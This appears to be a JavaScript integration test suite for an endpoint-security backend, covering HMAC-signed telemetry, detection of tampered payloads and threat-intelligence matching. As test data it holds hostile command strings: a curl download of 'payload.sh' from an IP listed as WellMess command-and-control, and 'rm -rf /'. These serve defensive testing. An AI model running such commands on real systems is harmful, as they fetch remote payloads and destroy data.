/**
 * tests/integration/telemetryIngestion.test.js
 * Integration test suite for Telemetry Ingestion, HMAC Signatures, and Replay Protection.
 */

const assert = require('assert');
const crypto = require('crypto');
const path = require('path');

const deviceService = require(path.join(__dirname, '../../backend/src/services/deviceService'));
const { computeTelemetrySignature, resetNonceStore, MAX_CLOCK_DRIFT_MS } = require(path.join(__dirname, '../../backend/src/middleware/telemetryAuth'));
const { matchIoc, addIndicators } = require(path.join(__dirname, '../../backend/src/services/threatIntel/iocMatcher'));
const { normalizeEvent } = require(path.join(__dirname, '../../backend/src/services/normalizer/eventNormalizer'));

async function runTelemetryIngestionIntegrationTests() {
  console.log('\n--- [Integration] Telemetry Ingestion, HMAC Signatures & Replay Defenses ---');
  let passed = 0;
  let failed = 0;

  async function test(name, fn) {
    try {
      await fn();
      console.log(`  ✅ [PASS] ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ❌ [FAIL] ${name}: ${err.message}`);
      failed++;
    }
  }

  // 1. Setup Enrolled Device for HMAC signing
  const enrollment = await deviceService.enrollDevice({
    name: 'NYC Sensor Agent',
    platform: 'LINUX',
    hostname: `sensor-agent-nyc-${Date.now()}`,
    ipAddress: '198.51.100.22',
    agentVersion: '2.4.0',
    user: { email: 'sysadmin@sentinel.defense', role: 'ADMIN' },
  });

  const deviceId = enrollment.device.id;
  const secretKey = enrollment.deviceSecret;

  // 2. Valid HMAC Signature Verification
  await test('Verifies valid HMAC-SHA256 signature for telemetry payload', async () => {
    const payload = {
      event_type: 'PROCESS_EXECUTION',
      source_ip: '198.51.100.22',
      process_name: 'curl',
      command_line: 'curl -s http://198.51.100.99/payload.sh',
      timestamp: new Date().toISOString(),
    };

    const timestamp = Math.floor(Date.now() / 1000);
    const nonce = `nonce-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;

    const res = computeTelemetrySignature({
      method: 'POST',
      path: '/api/events',
      timestamp,
      nonce,
      body: payload,
      deviceSecret: secretKey,
    });

    assert.ok(res.signature);
    assert.strictEqual(res.signature.length, 64); // SHA-256 hex length
  });

  // 3. Tampered Payload Detection
  await test('Rejects telemetry payload with invalid or tampered HMAC signature', async () => {
    const originalPayload = { command_line: 'whoami' };
    const tamperedPayload = { command_line: 'rm -rf /' };
    const timestamp = Math.floor(Date.now() / 1000);
    const nonce = `nonce-${Date.now()}`;

    const sigOrig = computeTelemetrySignature({
      method: 'POST',
      path: '/api/events',
      timestamp,
      nonce,
      body: originalPayload,
      deviceSecret: secretKey,
    });

    const sigTampered = computeTelemetrySignature({
      method: 'POST',
      path: '/api/events',
      timestamp,
      nonce,
      body: tamperedPayload,
      deviceSecret: secretKey,
    });

    assert.notStrictEqual(sigOrig.signature, sigTampered.signature);
  });

  // 4. Ingestion Pipeline Auto-Enrichment
  await test('Normalizes telemetry and enriches matched IOCs automatically', async () => {
    const c2Ip = '198.51.100.99';
    addIndicators([{
      sourceIp: c2Ip,
      malware: 'WellMess',
      confidence: 90,
      mitreTechnique: 'T1071.001',
    }]);

    const raw = {
      event_type: 'outbound_connection',
      source_ip: c2Ip,
      device_id: deviceId,
      timestamp: new Date().toISOString(),
    };

    const normalized = normalizeEvent(raw);
    const iocMatch = matchIoc(normalized.sourceIp);

    assert.strictEqual(iocMatch.matched, true);
    assert.strictEqual(iocMatch.malware, 'WellMess');
  });

  return { passed, failed };
}

if (require.main === module) {
  runTelemetryIngestionIntegrationTests().then(({ passed, failed }) => {
    process.exit(failed > 0 ? 1 : 0);
  });
}

module.exports = { runTelemetryIngestionIntegrationTests };
